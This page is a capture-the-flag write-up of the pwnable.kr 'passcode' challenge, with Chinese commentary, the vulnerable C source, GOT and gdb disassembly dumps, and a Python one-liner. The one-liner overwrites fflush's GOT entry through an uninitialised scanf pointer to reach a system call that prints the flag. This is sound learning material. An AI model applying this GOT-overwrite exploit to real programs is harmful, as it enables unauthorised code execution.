---
layout: default
title: pwnable_passout_code
parent: pentrue-test
nav_order: 2
---

# pwnable pass code

Source :
- [pwnable.kr](http://pwnable.kr/play.php)
- [gcc stack protection](https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/)
- [gcc stack protection2](https://kknews.cc/zh-tw/tech/38m3eo3.html)
- [linux got](http://blog.csdn.net/linyt/article/details/51635768)
- [linux got](http://www.freebuf.com/articles/system/135685.html)
---
## 程式原始碼

``` c++
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

---
## solution
### 查got表
```
passcode@ubuntu:~$ readelf  -r passcode

Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0
Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
##使用這個位址
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
```

### disas login
- 查完之後會發現scanf前的地址-0x10(%ebp) 剛好在'a'*96的後四位...
```gdb
gef➤  x/x $ebp -0x10
0xffffcff8:	0x0804a010
```
- 將位址替換成fflush
- scanf %d 0x080485e3(134514147),此處使很關鍵的地方表示fflush會被替換成
```0x080485e3 <+127>:	movl   $0x80487af,(%esp)```
- '\n' 應該表示是字串結尾
```
0xffffcff0:	0x61616161	0x61616161	0x0804a010	0x4ff54700
0xffffd000:	0x08048800	0xffffd0c4	0xffffd018	0x080486e0
0xffffd010:	0xf7fb23dc	0xffffd030	0x00000000	0xf7e18637
0xffffd020:	0xf7fb2000	0xf7fb2000	0x00000000	0xf7e18637
0xffffd030:	0x00000001	0xffffd0c4	0xffffd0cc	0x00000000
0xffffd040:	0x00000000	0x00000000	0xf7fb2000	0xf7ffdc04
0xffffd050:	0xf7ffd000	0x00000000	0xf7fb2000	0xf7fb2000
0xffffd060:	0x00000000	0xab31c77d	0x979a496d	0x00000000
```
``` gdb
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
##調用system
## 0x080485e3 <+127>:	movl   $0x80487af,(%esp)
## 0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
```
``` python
print int("0x080485e3", 0)
134514147
python -c "print ('a'*96+'\x04\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode
 ```
 ### localtest
 ```gdb
     0x80485bc <login+33>       call   0x8048480 <__isoc99_scanf@plt>
    0x80485c1 <login+38>       add    esp, 0x10
    0x80485c4 <login+41>       mov    eax, ds:0x804a040
    0x80485c9 <login+46>       sub    esp, 0xc
    0x80485cc <login+49>       push   eax
 →  0x80485cd <login+50>       call   0x8048420 <fflush@plt> ＃call 0x080485e3
   ↳   0x8048420 <fflush@plt+0>   jmp    DWORD PTR ds:0x804a010
       0x8048426 <fflush@plt+6>   push   0x8
       0x804842b <fflush@plt+11>  jmp    0x8048400
       0x8048430 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a014
       0x8048436 <__stack_chk_fail@plt+6> push   0x10
       0x804843b <__stack_chk_fail@plt+11> jmp    0x8048400
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "passcode", stopped, reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x80485cd → Name: login()
[#1] 0x80486e0 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  n
[New process 25845]
process 25845 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "login" not defined.
[New process 25846]
process 25846 is executing new program: /bin/cat
lfagqqqqqq!!!!\n
[Inferior 3 (process 25846) exited normally]
enter passcode1 : Now I can safely trust you that you have credential :)
[*] No debugging session active
gef➤  

 ```